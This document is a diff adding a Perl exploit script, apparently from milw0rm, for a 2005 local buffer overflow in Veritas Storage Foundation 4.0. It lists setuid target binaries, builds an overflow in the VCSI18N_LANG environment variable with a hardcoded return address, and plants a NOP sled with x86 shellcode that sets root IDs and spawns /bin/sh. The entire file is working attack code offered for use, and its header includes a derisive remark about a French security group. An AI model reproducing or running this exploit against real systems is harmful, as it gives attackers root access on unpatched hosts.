@@ -1,0 +1,66 @@
+#!/usr/bin/perl -w
+#
+# Veritas Storage Foundation 4.0 
+#
+# http://www.digitalmunition.com
+# kf (kf_lists[at]digitalmunition[dot]com) - 08/19/2005
+#
+# This bug has not been patched as of:
+# Q14438H.sf.4.0.00.0.rhel3_i686.tar.gz
+#
+# Make sure you don't get your sploits from some
+# Frenchie at FR-SIRT go to milw0rm instead.
+#
+$retval = 0xbffffc17;
+
+$tgts{"0"} = "/opt/VRTSvcs/bin/haagent:72";
+$tgts{"1"} = "/opt/VRTSvcs/bin/haalert:72";
+$tgts{"2"} = "/opt/VRTSvcs/bin/haattr:72";
+$tgts{"3"} = "/opt/VRTSvcs/bin/hacli:72";
+$tgts{"4"} = "/opt/VRTSvcs/bin/hareg:72";
+$tgts{"5"} = "/opt/VRTSvcs/bin/haclus:72";
+$tgts{"6"} = "/opt/VRTSvcs/bin/haconf:72";
+$tgts{"7"} = "/opt/VRTSvcs/bin/hadebug:72";
+$tgts{"8"} = "/opt/VRTSvcs/bin/hagrp:72";
+$tgts{"9"} = "/opt/VRTSvcs/bin/hahb:72";
+$tgts{"10"} = "/opt/VRTSvcs/bin/halog:72";
+$tgts{"11"} = "/opt/VRTSvcs/bin/hares:72";
+$tgts{"12"} = "/opt/VRTSvcs/bin/hastatus:72";
+$tgts{"13"} = "/opt/VRTSvcs/bin/hasys:72";
+$tgts{"14"} = "/opt/VRTSvcs/bin/hatype:72";
+$tgts{"15"} = "/opt/VRTSvcs/bin/hauser:72";
+$tgts{"16"} = "/opt/VRTSvcs/bin/tststew:72";
+
+unless (($target) = @ARGV) {
+
+        print "\n        Veritas Storage Foundation VCSI18N_LANG overflow, kf \(kf_lists[at]digitalmunition[dot]com\) - 08/19/2005\n";
+        print "\n\nUsage: $0 <target> \n\nTargets:\n\n";
+
+        foreach $key (sort(keys %tgts)) {
+                ($a,$b) = split(/\:/,$tgts{"$key"});
+                print "\t$key . $a\n";
+        }
+
+        print "\n";
+        exit 1;
+}
+
+$ret = pack("l", ($retval));
+($a,$b) = split(/\:/,$tgts{"$target"});
+print "*** Target: $a, Len: $b\n\n";
+
+$sc = "\x90"x1024;
+$sc .= "\x31\xd2\x31\xc9\x31\xdb\x31\xc0\xb0\xa4\xcd\x80";
+$sc .= "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b";
+$sc .= "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd";
+$sc .= "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+$buf = "A" x $b;
+$buf .= "$ret" x 2;
+
+$ENV{"VCSI18N_LANG"} = $buf;
+$ENV{"DMR0x"} = $sc;
+
+exec("$a DMR0x");
+
+# milw0rm.com [2005-11-12]
